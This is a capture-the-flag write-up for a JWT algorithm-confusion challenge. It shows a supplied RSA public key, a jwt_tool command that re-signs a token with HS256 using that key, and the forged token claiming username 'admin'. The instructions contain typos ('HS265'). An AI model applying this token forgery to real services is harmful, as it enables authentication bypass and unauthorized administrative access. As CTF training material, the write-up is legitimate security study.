You find an API with 3 endpoints:

    /key (accessible with GET)
    /auth (accessible with POST)
    /admin (accessible with POST)

There is sure to be important data in the admin section, access it!

The given public key:
```
-----BEGIN PUBLIC KEY-----
MIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEAp/IZR0LGKHLQNDtUx7aq
egsv0o5d1WQGDZ3ORz+AjccPos4T/UhCkiwV1BEJnJ4wGWR0jfQ6e0iJ0oqsIJaG
J7xpWxi8fXd/SKPHXiggW7IBudCfr131NDHI71/kJM2u8pkcxre/ZqTWaIMbHGJO
QPO0zevmsK3xdnyA3pWa7LhiuMhJj1hUfESkhdbFeglYaZiilQU2eb8v1cpWzc34
SJLQuzvqAfiH49No+uK28GAz5vw3BT50jnmjzNEMsdomUFTHJtWizqIAe96KMlhg
trZCOH6WI4wj/H9dkAKWzwyE/MQMICz0aQrh05blGmzkgvC/klU02hDK59Mnxkdc
vwIDAQAB
-----END PUBLIC KEY-----
```
The given JWT

![alt text](image/image-5.png)

To solve the challenge, first get the base64-encoded of the public key to a `k` value of a new sysmetric key, change the `alg` to `HS265` and sign with the new key.

Or we could use `jwt_tool`
```
python3 jwt_tool.py <token> -S hs256 -k public.pem
```


```
(jwt_env) ┌─[nguyenlong05@sw1mj3llyf1sh] - [~/tempf/jwt_tool] - [Fri Jan 31, 15:47]
└─[$] <git:(master*)> python3 jwt_tool.py eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6ImFkbWluIn0.MIXorWvQ3hY92IT0R5SYpiN-bgpQtnA7lEkHbT_ggDA -S hs256 -k public.pem 

        \   \        \         \          \                    \ 
   \__   |   |  \     |\__    __| \__    __|                    |
         |   |   \    |      |          |       \         \     |
         |        \   |      |          |    __  \     __  \    |
  \      |      _     |      |          |   |     |   |     |   |
   |     |     / \    |      |          |   |     |   |     |   |
\        |    /   \   |      |          |\        |\        |   |
 \______/ \__/     \__|   \__|      \__| \______/  \______/ \__|
 Version 2.2.7                \______|             @ticarpi      

Original JWT: 

=====================
Decoded Token Values:
=====================

Token header values:
[+] alg = "HS256"
[+] typ = "JWT"

Token payload values:
[+] username = "admin"

----------------------
JWT common timestamps:
iat = IssuedAt
exp = Expires
nbf = NotBefore
----------------------

jwttool_be8b4a81c7d5622b5a861d774e6fac73 - Tampered token - HMAC Signing:
[+] eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6ImFkbWluIn0.YmpOl0OXbBTTdlrbhNB3XseJZCNYxszgOV_ngIU8wkc
```
![alt text](image/image-6.png)